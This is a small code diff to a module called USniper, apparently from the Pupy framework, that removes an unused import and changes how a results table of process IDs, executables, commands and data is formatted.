@@ -2,7 +2,6 @@
 
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import obtain
-from pupylib.PupyCmd import PupyCmd
 
 __class_name__ = 'USniper'
 
@@ -89,7 +88,7 @@ class USniper(PupyModule):
                             'CMD': ' '.join(values['cmd'])
                         })
 
-        self.log(PupyCmd.table_format(records, wl=['PID', 'EXE', 'CMD', 'DATA']))
+        self.log(self.formatter.table_format(records, wl=['PID', 'EXE', 'CMD', 'DATA']))
 
     def run(self, args):
         args.func(args)
